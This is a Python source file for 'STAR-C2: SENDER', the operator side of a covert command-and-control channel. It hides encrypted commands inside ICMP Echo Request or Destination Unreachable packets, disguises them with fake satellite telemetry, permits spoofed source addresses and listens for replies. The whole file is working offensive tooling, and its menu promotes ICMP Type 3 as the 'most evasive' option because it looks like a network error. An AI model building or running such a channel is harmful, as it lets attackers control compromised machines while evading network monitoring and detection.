#!/usr/bin/env python3
"""
STAR-C2: SENDER
Send messages via Type 8 (Echo Request) or Type 3 (Destination Unreachable)
User chooses at runtime
"""

import struct
import sys
import random
import time
import logging
from scapy.all import IP, ICMP, Raw, send, sniff, conf
import numpy as np

conf.ipv6_enabled = False
conf.checkIPsrc = False
conf.verbose = 0

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# CONSTANTS
# ============================================================================

SYNC = b"STR1"
SATID = b"GXY"
FRAME_ID = 0xA1
SEED = b"\x12\x34\x56\x78"

MIN_ICMP_PAYLOAD = 64
MAX_ICMP_PAYLOAD = 256

# ============================================================================
# CA ENCRYPTION
# ============================================================================

def rule90_step(arr: np.ndarray) -> np.ndarray:
    left = np.roll(arr, 1)
    right = np.roll(arr, -1)
    return (left ^ right).astype(np.uint8)

def ca_keystream(seed_bytes: bytes, length_bits: int) -> np.ndarray:
    state = np.unpackbits(np.frombuffer(seed_bytes, dtype=np.uint8))
    ks = np.zeros(length_bits, dtype=np.uint8)
    for i in range(length_bits):
        ks[i] = state[len(state) // 2]
        state = rule90_step(state)
    return ks

def ca_encode_message(msg: str, seed: bytes) -> bytes:
    if not msg:
        return b""
    msg_bits = np.unpackbits(np.frombuffer(msg.encode(), dtype=np.uint8))
    ks = ca_keystream(seed, len(msg_bits))
    enc_bits = msg_bits ^ ks
    return np.packbits(enc_bits).tobytes()

def ca_decode_message(enc_bytes: bytes, seed: bytes) -> str:
    if not enc_bytes:
        return ""
    enc_bits = np.unpackbits(np.frombuffer(enc_bytes, dtype=np.uint8))
    ks = ca_keystream(seed, len(enc_bits))
    dec_bits = enc_bits ^ ks
    if len(dec_bits) % 8 != 0:
        dec_bits = dec_bits[:len(dec_bits) - (len(dec_bits) % 8)]
    return np.packbits(dec_bits).tobytes().decode(errors='ignore')

# ============================================================================
# SATELLITE METADATA
# ============================================================================

def generate_metadata() -> bytes:
    orbit = random.choice([
        random.randint(380, 420),
        random.randint(19500, 20500),
        random.randint(35700, 36300)
    ])
    lat = random.uniform(-90, 90)
    lon = random.uniform(-180, 180)
    temp = random.randint(-100, 100)
    volt = random.randint(28, 32)
    return struct.pack(">HffbB", orbit, lat, lon, temp, volt)

# ============================================================================
# FRAME BUILDING
# ============================================================================

def build_frame(msg: str) -> bytes:
    """Build STAR-C2 frame"""
    enc_msg = ca_encode_message(msg, SEED)
    frame = (
        SYNC +
        SATID +
        generate_metadata() +
        bytes([FRAME_ID]) +
        b'\x00' +  # Reserved byte
        SEED +
        enc_msg
    )
    
    if len(frame) < MIN_ICMP_PAYLOAD:
        pad_size = random.randint(MIN_ICMP_PAYLOAD - len(frame),
                                 MAX_ICMP_PAYLOAD - len(frame))
        frame += b'\x00' * pad_size
    return frame

def build_icmp_packet(src_ip: str, dst_ip: str, frame: bytes,
                     icmp_type: int, seq: int) -> IP:
    """Build ICMP packet"""
    pkt = IP(src=src_ip, dst=dst_ip) / ICMP(type=icmp_type, seq=seq) / Raw(load=frame)
    return pkt

# ============================================================================
# SENDER CLASS
# ============================================================================

class Sender:
    def __init__(self, src_ip: str, dst_ip: str):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.seq_counter = random.randint(0, 1000)
        self.selected_type = None
    
    def ask_icmp_type(self) -> int:
        """Ask user which ICMP type to use"""
        print(f"""
╔═══════════════════════════════════════════════════════════════╗
║ SELECT ICMP TYPE FOR SENDING ║
╚═══════════════════════════════════════════════════════════════╝

[8] Type 8 - ICMP Echo Request
    └─ Bidirectional
    └─ Receiver REPLIES with Type 0 (Echo Reply) + ACK
    └─ Good for command-response

[3] Type 3 - ICMP Destination Unreachable ⭐ MOST EVASIVE
    └─ Unidirectional (silent)
    └─ Receiver DOES NOT REPLY
    └─ Evades detection (appears as network error)
    └─ Best for stealth
""")
        
        while True:
            try:
                choice = input("[?] Select ICMP type (8/3): ").strip()
                icmp_type = int(choice)
                
                if icmp_type not in [3, 8]:
                    print("[!] Invalid choice. Please enter 3 or 8")
                    continue
                
                self.selected_type = icmp_type
                type_name = "Type 8 (Echo Request)" if icmp_type == 8 else "Type 3 (Destination Unreachable)"
                print(f"[+] Selected: {type_name}\n")
                return icmp_type
            except ValueError:
                print("[!] Invalid input. Please enter 3 or 8")
            except KeyboardInterrupt:
                print("\n[!] Cancelled")
                sys.exit(0)
    
    def send_message(self, msg: str) -> int:
        """Send message using selected ICMP type"""
        try:
            frame = build_frame(msg)
            seq = self.seq_counter
            pkt = build_icmp_packet(self.src_ip, self.dst_ip, frame,
                                   icmp_type=self.selected_type, seq=seq)
            send(pkt, verbose=False)
            
            type_name = "Type 8 (Echo Request)" if self.selected_type == 8 else "Type 3 (Dest Unreachable)"
            print(f"[✓] {type_name} sent")
            print(f"    Message: '{msg}'")
            print(f"    Sequence: {seq}")
            
            if self.selected_type == 8:
                print(f"    [+] Waiting for Type 0 reply...")
            else:
                print(f"    [!] No reply expected (silent)")
            
            self.seq_counter = random.randint(0, 65535)
            return seq
        except Exception as e:
            logger.error(f"Send failed: {e}")
            print(f"[-] Failed to send: {e}")
            return -1
    
    def listen_for_reply(self, timeout: int = 3):
        """Listen for Type 0 reply (only for Type 8)"""
        if self.selected_type != 8:
            return
        
        def reply_handler(pkt):
            if ICMP not in pkt:
                return
            if pkt[ICMP].type != 0:  # Type 0 (Echo Reply)
                return
            if Raw not in pkt:
                return
            
            data = pkt[Raw].load
            try:
                if data.startswith(SYNC):
                    enc_msg = data[25:]
                    msg = ca_decode_message(enc_msg, SEED)
                    print(f"\n{'=' * 60}")
                    print(f"[✓ REPLY RECEIVED - Type 0 (Echo Reply)]")
                    print(f"{'=' * 60}")
                    print(f"From: {pkt[IP].src}")
                    print(f"Message: {msg}")
                    print(f"{'=' * 60}\n")
            except:
                pass
        
        try:
            sniff(filter=f"icmp[0]=0 and src {self.dst_ip}",
                  prn=reply_handler, store=False, timeout=timeout)
        except:
            pass

# ============================================================================
# MAIN
# ============================================================================

def main(src_ip: str, dst_ip: str):
    """Interactive sender"""
    print(f"""
╔═══════════════════════════════════════════════════════════════════╗
║ STAR-C2: SENDER ║
║ Send via Type 8 (Echo Request) or Type 3 (Destination Unreachable) ║
╚═══════════════════════════════════════════════════════════════════╝

[+] Source IP: {src_ip}
[+] Destination IP: {dst_ip}

[COMMANDS]
- Type message → Send command
- 'type' → Change ICMP type
- 'exit' → Quit
""")
    
    sender = Sender(src_ip, dst_ip)
    sender.ask_icmp_type()
    
    try:
        while True:
            try:
                msg = input(">>> ").strip()
            except EOFError:
                break
            except KeyboardInterrupt:
                print("\n[!] Stopped")
                break
            
            if not msg:
                continue
            
            if msg.lower() == 'exit':
                break
            
            if msg.lower() == 'type':
                sender.ask_icmp_type()
                continue
            
            seq = sender.send_message(msg)
            if seq >= 0 and sender.selected_type == 8:
                sender.listen_for_reply(timeout=3)
            
            time.sleep(0.5)
    
    except Exception as e:
        logger.error(f"Error: {e}")
    finally:
        print("\n[!] Sender stopped")
        sys.exit(0)

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"""
STAR-C2: SENDER

Usage: python sender.py <src_ip> <dst_ip>

Example:
  python sender.py 10.128.3.51 10.128.3.51

Then select ICMP type (8 or 3) and send messages!
""")
        sys.exit(1)
    
    src_ip = sys.argv[1]
    dst_ip = sys.argv[2]
    main(src_ip, dst_ip)
